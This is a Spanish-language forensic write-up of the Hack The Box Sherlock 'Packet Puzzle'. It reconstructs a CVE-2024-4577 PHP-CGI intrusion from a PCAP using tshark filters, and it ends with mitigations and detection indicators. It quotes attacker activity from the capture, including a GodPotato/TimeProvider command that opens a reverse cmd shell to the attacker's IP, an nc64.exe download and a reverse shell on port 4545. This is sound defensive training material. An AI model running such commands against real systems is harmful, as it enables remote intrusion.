---
sherlock: Packet Puzzle
domain: DFIR / Red
difficulty: Medium
platform: Hack The Box
evidence: PCAP de una empresa japonesa de criptomonedas
tools: [Wireshark, tshark, CyberChef]
state: Retired
tags: [dfir, pcap, cve-2024-4577, php, godpotato, t1190]
---

# Packet Puzzle — Hack The Box (Sherlock)

[⚑ English](README.en.md) | **Español**

> Investigación defensiva. Sin respuestas literales de la plataforma.
>
> **Veredicto: `[CORREGIDO]`.** La ficha describía un acceso por **RDP** seguido de movimiento lateral **SMB**; ningún writeup público lo respalda. Contrastado con **cyb3rloud** y **FinalBreach**, el caso es una **inyección de argumentos en el CGI de PHP (CVE-2024-4577)** explotada por HTTP POST, con un intento de escalada por **GodPotato** que **falla**. Cadena reescrita por completo.

## Escenario

Analista junior en una pequeña empresa japonesa de intercambio de criptomonedas. Tras detectar actividad sospechosa en la red interna se exporta un PCAP: hay que decidir si hubo compromiso y reconstruir los pasos del atacante.

## Evidencias

- `NetworkTraffic.pcap` dentro del ZIP protegido que entrega la plataforma.
- Atacante `192.168.170.128` (1.083 paquetes hacia la víctima) y servidor `192.168.170.130`.

## Investigación

### 1. Quién habla y cuántos puertos abiertos hay

`Statistics → Conversations → IPv4` ordenado por paquetes deja al origen `192.168.170.128` dominando el tráfico hacia `.130`. Para contar lo que **responde** hay que mirar los SYN-ACK del servidor, no los SYN del atacante:

```bash
tshark -r NetworkTraffic.pcap \
  -Y "ip.src == 192.168.170.130 && ip.dst == 192.168.170.128 && tcp.flags.syn == 1 && tcp.flags.ack == 1" \
  -T fields -e tcp.srcport | sort -u
```

Ocho puertos: **22, 80, 135, 139, 443, 445, 3389 y 5357**. El primero en responder, en orden cronológico, es el **22**.

### 2. El vector real: HTTP POST contra PHP

El 3389 está abierto pero **no se usa**: no hay sesión RDP ni intentos de credenciales. La entrada es HTTP. Se filtran los POST del atacante y se sigue el flujo:

```bash
tshark -r NetworkTraffic.pcap -Y 'http.request.method == "POST" && ip.src == 192.168.170.128' \
  -T fields -e frame.number -e frame.time -e http.request.uri
```

En el `Follow → HTTP Stream` se ve **PHP 8.1.25** y una orden ejecutada por el intérprete: es **CVE-2024-4577**, inyección de argumentos en el CGI de PHP sobre Windows, que convierte una petición HTTP en ejecución de comandos. El `whoami` de la misma conversación devuelve **`cristo`**.

- Foothold: **2025-01-22 09:47:32** (paquete con el `TCPClient` de la reverse shell).
- Técnica: **T1190 — Exploit Public-Facing Application**.

### 3. Reverse shell y herramienta de escalada

Tras el POST, el atacante descarga **`nc64.exe`** desde su propia IP y abre una consola interactiva contra el **puerto 4545**:

```bash
tshark -r NetworkTraffic.pcap -Y 'tcp.port == 4545' -T fields -e ip.src -e ip.dst -e tcp.len
tshark -r NetworkTraffic.pcap -Y 'frame contains ".exe"' -V | grep -i "exe"
```

En esa sesión se ve un `iwr` (Invoke-WebRequest) de **`GodPotato-NET4.exe`**: el atacante lo descarga y lo ejecuta **en memoria**. Después lanza:

```text
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

### 4. El intento falla

La respuesta llega en el mismo flujo del 4545:

```text
Cannot create process Win32Error:2
```

`Win32Error:2` significa «fichero no encontrado»: el binario, o el `time.exe` que esperaba, **no existe** en esa ruta, así que la escalada **no se completa**. El caso se cierra con acceso como `cristo` y sin SYSTEM.

### 5. Cronología

1. Barrido de reconocimiento y 8 puertos abiertos (22 el primero).
2. POST con CVE-2024-4577 → ejecución como `cristo` (09:47:32).
3. `nc64.exe` → reverse shell en 4545.
4. `GodPotato-NET4.exe` en memoria y `TimeProvider.exe -cmd ...` → `Win32Error:2`.
5. Sin RDP, sin SMB y sin movimiento lateral: el compromiso se queda en un host.

## Conclusiones

- El vector es **web**, no RDP: el 3389 abierto es superficie, no entrada, y confundirlos fue el error de la versión anterior.
- La cadena completa vive en el PCAP: escaneo → POST → shell → descarga → intento de escalada fallido.
- El fallo de escalada importa tanto como el acceso: `Win32Error:2` demuestra que el atacante **no** llegó a SYSTEM.

## Lecciones

- Contar SYN-ACK, no SYN: los puertos abiertos son los que responden, y su orden temporal da el primero.
- `Follow → HTTP Stream` convierte un POST ofuscado en código legible; ahí aparecen versión, usuario y comando.
- Un `http contains "client"` localiza la reverse shell por el `TCPClient` de PowerShell, sin adivinar el puerto.

## Mitigaciones y detección

- Actualizar PHP: CVE-2024-4577 afecta a instalaciones en Windows con CGI y determinadas páginas de código; desactivar el modo CGI cuando no sea imprescindible.
- Bloquear la salida desde servidores web salvo destinos necesarios: la reverse shell al 4545 muere sin egress.
- Detección: POST a `php-cgi` con caracteres de argumento (`%ad`, `%2d`) y procesos `php-cgi` con hijos `cmd.exe`; ejecución en memoria de GodPotato y binarios descargados con `iwr`.

## Referencias

- cyb3rloud, *Packet Puzzle Sherlock Writeup*: <https://cyb3rloud.medium.com/packet-puzzle-sherlock-writeup-hack-the-box-3fd0eaf6f3d8>
- FinalBreach, *Write Up of Packet Puzzle*: <https://finalbreach.com/posts/HackTheBox-Packet-Puzzle-WriteUp/>
